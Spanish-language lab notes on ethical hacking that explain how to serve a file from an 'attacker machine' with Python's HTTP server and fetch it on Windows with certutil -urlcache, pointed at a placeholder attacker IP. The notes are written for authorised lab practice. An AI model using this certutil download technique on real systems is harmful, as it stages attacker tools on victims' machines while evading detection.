> [!info] Idea principal
> Para descargar archivos en una **maquina Windows** desde la **maquina atacante**, puedo levantar un servidor HTTP con Python y usar `certutil` desde Windows para descargar el archivo.

## Que es certutil

`certutil` es una herramienta incluida en Windows que normalmente se usa para tareas relacionadas con certificados, pero tambien permite descargar archivos desde una URL.

En laboratorios de hacking etico se puede usar cuando no tenemos herramientas como `wget` o `curl` disponibles en la maquina Windows.

> [!warning] Importante
> Usar este metodo solo en laboratorios, maquinas propias o entornos donde tengas permiso.

## Flujo de Trabajo

> [!example] Resumen
> 1. En la maquina atacante preparo el archivo que quiero compartir.
> 2. Levanto un servidor HTTP con Python.
> 3. En la maquina Windows uso `certutil` para descargar el archivo.
> 4. Compruebo que el archivo se ha descargado correctamente.

## Paso 1: Preparar el Archivo en la Maquina Atacante

Primero debo colocarme en la carpeta donde esta el archivo que quiero compartir:

```bash
cd /ruta/del/archivo
```

Por ejemplo:

```bash
cd /home/kali/compartidos
```

## Paso 2: Levantar un Servidor HTTP con Python

En la maquina atacante ejecuto:

```bash
python3 -m http.server 80
```

Esto deja disponible el contenido de la carpeta actual mediante HTTP.

> [!tip] Puerto alternativo
> Si el puerto `80` da problemas, puedo usar otro puerto como `8000`:
>
> ```bash
> python3 -m http.server 8000
> ```

## Paso 3: Descargar el Archivo desde Windows

En la maquina Windows, abro una consola `cmd` o `PowerShell` y ejecuto:

```cmd
certutil -split -urlcache -f http://IP_ATACANTE/archivo archivo
```

Ejemplo:

```cmd
certutil -split -urlcache -f http://192.168.0.8/compartir.mp4 compartir.mp4
```

## Explicacion del Comando

- `certutil`: herramienta de Windows usada para la descarga.
- `-split`: permite dividir la descarga en bloques.
- `-urlcache`: usa la cache de URL de Windows.
- `-f`: fuerza la descarga aunque el archivo ya exista.
- `http://192.168.0.8/compartir.mp4`: URL del archivo en la maquina atacante.
- `compartir.mp4`: nombre con el que se guardara el archivo en Windows.

## Ejemplo Completo

En la maquina atacante:

```bash
cd /home/kali/compartidos
python3 -m http.server 80
```

En la maquina Windows:

```cmd
certutil -split -urlcache -f http://192.168.0.8/compartir.mp4 compartir.mp4
```

## Comprobar la Descarga

En Windows puedo comprobar que el archivo existe con:

```cmd
dir
```

Si quiero revisar la ruta actual:

```cmd
cd
```

> [!tip] Consejo
> Antes de descargar, confirmar que la IP de la maquina atacante es correcta y que el servidor HTTP sigue activo.

## Checklist Rapido

- [ ] Estar en la carpeta correcta antes de levantar el servidor.
- [ ] Ejecutar `python3 -m http.server 80`.
- [ ] Confirmar la IP de la maquina atacante.

- [ ] Verificar que el archivo se ha descargado.
